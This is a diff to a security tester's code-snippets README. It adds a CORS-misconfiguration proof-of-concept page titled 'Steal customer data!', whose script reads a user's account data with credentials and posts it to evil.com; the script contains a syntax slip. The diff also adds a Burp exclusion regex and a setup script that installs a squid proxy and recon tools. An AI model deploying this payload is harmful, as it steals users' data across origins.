@@ -1,4 +1,4 @@
-## (Personal) Code Snippets
+## (Useful) Code Snippets
 
 A github repo maintaining mostly (python) code snippets which I use approximately daily and to save time searching for them in local source code/via google. 
 
@@ -890,4 +890,81 @@ Run it with:
 ```bash
 python3 gen.py
 cat wordlist.txt | sort | uniq > sort_uniq_wordlist_5chars.txt
+```
+
+---
+
+#### POC for C0RS
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h3>Steal customer data!</h3>
+<html>
+<body>
+<button type='button' onclick='cors()'>Exploit</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from subdomain.site.com about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data=" a);
+}
+};
+xhttp.open("GET", "https://subdomain.site.com/data-endpoint", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
+```
+
+---
+
+### Burp extensions to exclude
+
+```powershell
+.*\.(gif|jpg|png|css|js|ico|svg|eot|woff|woff2|ttf|ts|mp4|otf|jpeg)
+```
+
+---
+
+### Instance setup
+
+Quick and dirty setup of instance with .tmux.conf and squid-proxy
+
+```bash
+sudo apt update && \
+    sudo apt-get upgrade -y && \
+    cd && \
+    sudo apt-get install -y squid squid-deb-proxy squid-deb-proxy-client squidclient apache2-utils wget curl net-tools nano python3 python3-pip aria2 && \
+    sudo apt-get install -y tmux htop file git p7zip-full ruby ruby-dev zlib1g-dev && \
+    sudo service squid start && \
+    sudo rm -rfv /etc/squid/squid.conf && \
+    sudo wget https://gist.githubusercontent.com/Anon-Exploiter/c4e96ada91771bc9ee934cf1f297fad5/raw/0a219fd41f075e0b848bd46c0910ccc55aca9f06/squid.conf -O /etc/squid/squid.conf && \
+    echo "Please enter proxy password: " && \
+    sudo htpasswd -c /etc/squid/.htpasswd proxy && \
+    sudo systemctl restart squid && \
+    sudo service squid status && \
+    cd && \
+    wget https://gist.githubusercontent.com/Anon-Exploiter/15bca8962609da3a88c8ee96e49f0bd0/raw/71028ffdfc6f04b88d7463fdf8b208a7bda57894/.bashrc -O ~/.bashrc && \
+    wget https://gist.githubusercontent.com/Anon-Exploiter/261d377c51fbec1798b5913044c213fe/raw/2ce311d67414805230c3aa23f78bdf1b4d731212/.tmux.conf -O ~/.tmux.conf && \
+    cd && \
+    wget "https://github.com/OJ/gobuster/releases/download/v3.1.0/gobuster-linux-amd64.7z" -O gobuster-linux-amd64.7z && \
+    7z x gobuster-linux-amd64.7z && \
+    sudo mv gobuster-linux-amd64/* /usr/bin/ && \
+    sudo chmod +x /usr/bin/gobuster && \
+    rm -rfv gobuster* && \
+    cd && \
+    git clone https://github.com/maurosoria/dirsearch && \
+    cd
 ```
